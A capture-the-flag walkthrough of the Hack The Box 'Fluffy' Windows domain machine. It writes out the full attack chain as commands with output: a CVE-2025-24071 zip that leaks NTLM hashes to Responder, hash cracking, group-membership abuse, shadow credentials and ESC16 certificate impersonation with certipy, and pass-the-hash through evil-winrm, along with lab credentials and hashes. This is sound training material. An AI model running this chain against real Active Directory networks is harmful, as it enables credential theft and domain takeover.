---
title: "Hackthebox: Fluffy [Machine] [Season 8]"
author: c3l1kd
categories: [Hackthebox]
tags:
  [
    nmap,
    javascript-decoding,
    web-fuzzing,
    post-exploitation,
    privilege escalation,
    initial access,
  ]
render_with_liquid: false
img_path: /images/hackthebox_fluffy/
image:
  path: room_image.png
---

**Fluffy** machine which is easy rated windows box. This write-up covers <code class="highlight">initial access</code>, <code class="highlight">privilege escalation</code>, and <code class="highlight">post-exploitation</code> techniques.


<style>
    .highlight {
 background-color: #ffeb3b;
      padding: 0 5px;
      color: red;
      border-radius: 3px;
}
</style>

[![Hackthebox Room Link](room_banner.png)](https://app.hackthebox.com/machines/Fluffy)

> As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: <code class="highlight" >j.fleischman </code> / <code class="highlight">J0elTHEM4n1990!</code>

## Initial Enumeration

### Nmap Scan

```console
┌──(celikd㉿kali)-[~/Documents]
└─$ nmap -sC -sV 10.10.66.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 04:40 EDT
Nmap scan report for 10.10.66.17
Host is up (0.23s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-25 15:41:16Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T15:42:39+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17

445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T15:42:40+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T15:42:39+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T15:42:40+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17


5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m00s
| smb2-time:
|   date: 2025-05-25T15:41:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.43 seconds
```

There are five open ports:

- **53** (domain)
- **89/tcp**  (kerberos-sec)
- **139/tcp**  (netbios-ssn)
- **389/tcp**   (ldap)
- **445/tcp**   (microsoft-ds?)

Using the given credential if we list the shares available, we will find something interesting

```console
┌──(celikd㉿kali)-[~/Documents]
└─$ nxc smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
SMB         10.10.66.17    445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.66.17    445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.66.17    445    DC01             [*] Enumerated shares
SMB         10.10.66.17    445    DC01             Share           Permissions     Remark
SMB         10.10.66.17    445    DC01             -----           -----------     ------
SMB         10.10.66.17    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.66.17    445    DC01             C$                              Default share
SMB         10.10.66.17    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.66.17    445    DC01             IT              READ,WRITE      
SMB         10.10.66.17    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.66.17    445    DC01             SYSVOL          READ            Logon server share 
```

We have Read + Write access on `IT` share. Write access is interesting and unlocks a lot of attack path. Looking at the content on the `IT` share.

```console
┌──(celikd㉿kali)-[~/Documents]
└─$ smbclient //10.10.66.17/IT U j.fleischman 'JoelTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> ls
  ./
  ../
  Everything-1.4.1.1026.x64/         D        Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip      1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58/                      D        Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                   3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                A 169963  Sat May 17 10:31:07 2025
```

Opening `Upgrade_Notice.pdf` shows the system are in upgrade process and have multiple vulnerabilities. 

![cves](01.png){: width="1200" height="800" }

Among the listed CVE’s, `CVE-2025-24071` stands out.

`CVE-2025-24071` : An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user’s NTLM hash

Since we have write access to IT share, we will use [CVE-2025-24071](https://github.com/ThemeHackers/CVE-2025-24071/blob/main/exploit.py) exploit to generate malicious zip file, then upload it to IT share. After certain time it will be unzipped, meanwhile we will setup reponder and catch the victims hash.

```console
┌──(celikd㉿kali)-[~/Desktop/cves/CVE-2025-24071]
└─$ python exploit.py                                               
Enter your file name: documents
Enter IP (EX: 192.168.1.162): 10.10.66.17
completed

┌──(celikd㉿kali)-[~/Desktop/cves/CVE-2025-24071]
└─$ smbclient  //10.10.66.17/IT -U j.fleischman
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 29 10:19:20 2025
  ..                                  D        0  Thu May 29 10:19:20 2025
  docs.library-ms                     A      528  Thu May 29 10:16:50 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 1315680 blocks available
smb: \> put exploit.zip 
putting file exploit.zip as \exploit.zip (0.9 kb/s) (average 0.9 kb/s)
```

> Before Uploading Enable `responder` for monitoring 

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ responder -I tun0 -wvF
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.66.17]
    Responder IPv6             [dead:beef:4::1049]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-DU8IDYUEGAF]
    Responder Domain Name      [3CGF.LOCAL]
    Responder DCE-RPC Port     [48866]

[+] Listening for events...                                                                                                                     

[SMB] NTLMv2-SSP Client   : 10.10.66.17
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:94a991ee1dadb617:7CC7520C05900F433F9FAB0C71959703:0101000000000000809AE9316CD0DB012ECCE7CE4B886DE00000000002000800330043004700460001001E00570049004E002D004400550038004900440059005500450047004100460004003400570049004E002D00440055003800490044005900550045004700410046002E0033004300470046002E004C004F00430041004C000300140033004300470046002E004C004F00430041004C000500140033004300470046002E004C004F00430041004C0007000800809AE9316CD0DB0106000400020000000800300030000000000000000100000000200000313F0E1DD62774CA1E8F9DDBBB7990F703EA1C141D16C2B7DDFFE296E0CF07720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370035000000000000000000                                                                                                                                              
[SMB] NTLMv2-SSP Client   : 10.10.66.17
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:6109f53b6d82f7d7:AF4211657658A3B8F79DFDAC295C9728:0101000000000000809AE9316CD0DB01398EE1FFCFE429340000000002000800330043004700460001001E00570049004E002D004400550038004900440059005500450047004100460004003400570049004E002D00440055003800490044005900550045004700410046002E0033004300470046002E004C004F00430041004C000300140033004300470046002E004C004F00430041004C000500140033004300470046002E004C004F00430041004C0007000800809AE9316CD0DB0106000400020000000800300030000000000000000100000000200000313F0E1DD62774CA1E8F9DDBBB7990F703EA1C141D16C2B7DDFFE296E0CF07720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370035000000000000000000                                          
```

> We now have `NTLM` hash of user `p.agila`. Using hashcat, we can crack the hash

```console
p.agila::FLUFFY:44ba23f06d0012ce:2F92099ED0B0BB5FC9F5531238508F8A:0101000000000000802DEDF370CDDB015B78C485618BA9120000000002000800560034004B00310001001E00570049004E002D0058003800350037003300300048004F0033005300510004003400570049004E002D0058003800350037003300300048004F003300530051002E00560034004B0031002E004C004F00430041004C0003001400560034004B0031002E004C004F00430041004C0005001400560034004B0031002E004C004F00430041004C0007000800802DEDF370CDDB010600040002000000080030003000000000000000010000000020000040057427D0CC477C70729646E098F3FFCC99AA397785A5948567ED6E8FF151AE0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310036000000000000000000
```

Use `john` to crack

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)
```
## Bloodhound

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --bloodhound --collection All --dns-server 10.10.66.17

LDAP        10.10.66.17     389        dc01.fluffy.htb
[-] Error retrieving os arch of 10.10.66.17: Could not connect: timed out
SMB         10.10.66.17     445        DC01
[+] Windows 10 / Server 2019 Build 17763 (name: DC01) (domain: fluffy.htb) (signing: True) (SMBv1: False)
[+] fluffy.htb\j.fleischman: J0elTHEM4n1990!

Resolved collection methods: acl, rdp, objectprops, trusts, session, psremote, group, localadmin, container, dcom  
Done in 00M 41S

Compressing output into /home/dollarboysushil/.nxc/logs/DC01_10.10.66.17_2025-05-25_050736_bloodhound.zip
```


![map](02.png){: width="1200" height="800" }
Note that `p.agila` you can add yourself to `service` the user group
![map](03.png){: width="1200" height="800" }
Then the group has write permissions `service` for the user `CA_SVC`

## Generic All Exploit
To exploit Generic All permission, we will add user `p.agila` to Service Accounts group

```console
net rpc group addmem "Service accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "10.10.66.17"
```

## Verifying the group membership

```console
net rpc group members "Service accounts" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "10.10.66.17"
```

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ net rpc group members "Service accounts" -U "fluffy.htb"/"p.agila%prometheusx-303" -S "10.10.66.17"
# Output:
# FLUFFY\ca_svc
# FLUFFY\ldap_svc
# FLUFFY\winrm_svc

┌──(celikd㉿kali)-[~/Desktop]
└─$ net rpc group addmem "Service accounts" "p.agila" -U "fluffy.htb"/"p.agila%prometheusx-303" -S "10.10.66.17"

┌──(celikd㉿kali)-[~/Desktop]
└─$net rpc group members "Service accounts" -U "fluffy.htb"/"p.agila%prometheusx-303" -S "10.10.66.17"
# Output:
# FLUFFY\ca_svc
# FLUFFY\ldap_svc
# FLUFFY\p.agila
# FLUFFY\winrm_svc
```
Upon deeper dive, we can see `Service` Accounts Group has `Generic` Write permission over `3 users`. 
![map](04.png){: width="1200" height="800" }

## Generic Write Exploit
To exploit Generic Write permisison, we will use certipy-ad to perform shadow Credentials attack and dump the `NTLM` hash.
```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC'                           ⏎
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '5f3391a6-1fa0-c13f-9f4b-73cd3536412f'
[*] Adding Key Credential with device ID '5f3391a6-1fa0-c13f-9f4b-73cd3536412f' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '5f3391a6-1fa0-c13f-9f4b-73cd3536412f' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ evil-winrm -i fluffy.htb -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\winrm_svc\desktop> ls


    Directory: C:\Users\winrm_svc\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/29/2025   7:52 AM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\desktop>
```

## ESC16
`WINRM_SVC` The user doesn't seem to have anything special

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ certipy-ad find -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.66.17 -stdout -vuln

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```
No Templates Found

There exist [ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) Vulnerability. Using ESC16-Certipy guide we can proceed to priv esc.

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ certipy find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.66.17 -vulnerable   

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250529120822_Certipy.txt'
[*] Wrote text output to '20250529120822_Certipy.txt'
[*] Saving JSON output to '20250529120822_Certipy.json'
[*] Wrote JSON output to '20250529120822_Certipy.json'

┌──(celikd㉿kali)-[~/Desktop]
└─$ cat 20250529120822_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

There is [ESC16a](https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) vulnerability! , refer to the following link

## Step 1 - Read the original UPN of the victim account (optional - for recovery).
```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.66.17' -user 'ca_svc' read

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-05-29T15:31:53+00:00
```

## Step 2: Update the victim account’s UPN to that of the target administrator `sAMAccountName`.

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.66.17'  -upn 'administrator'  -user 'ca_svc' update

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```
## Step 3: Request a certificate issued as the `victim` user from any appropriate client authentication template* (e.g., `user`) on the `CA` vulnerable to `ESC16`

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.66.17' -account 'ca_svc' auto
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a73d1a8d-8d10-f6ac-d20e-fe25791a1161'
[*] Adding Key Credential with device ID 'a73d1a8d-8d10-f6ac-d20e-fe25791a1161' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'a73d1a8d-8d10-f6ac-d20e-fe25791a1161' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ export KRB5CCNAME=ca_svc.ccache
```
Then request a `certificate`

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ certipy req -k -dc-ip '10.10.66.17' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
## Step 4: Restore the UPN of the `victim` account.

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.66.17' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update            ⏎
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```
## Step 5: Authenticate as the target `administrator`.

```console
┌──(celikd㉿kali)-[~/Desktop]
└─$ certipy auth -dc-ip '10.10.66.17' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```
We now have NTLM hash of administrator. Using this NTLM hash, we can get win-rm session as user administrator and get the `root.txt`.

```console
evil-winrm -i fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

# ROOT.TXT
![root](01.png){: width="1200" height="800" }

## Summary
User : `SMB` The file leak is found `CVE-2025-24071`. After obtaining the domain user, a shadow credential attack can be performed to obtain the shadow credentials of the other three users.
Root : Upgrade to the latest version `Certipy`, find the `ESC16` vulnerability, and follow the steps.

## THANK YOU WITH ❤️C3L1KD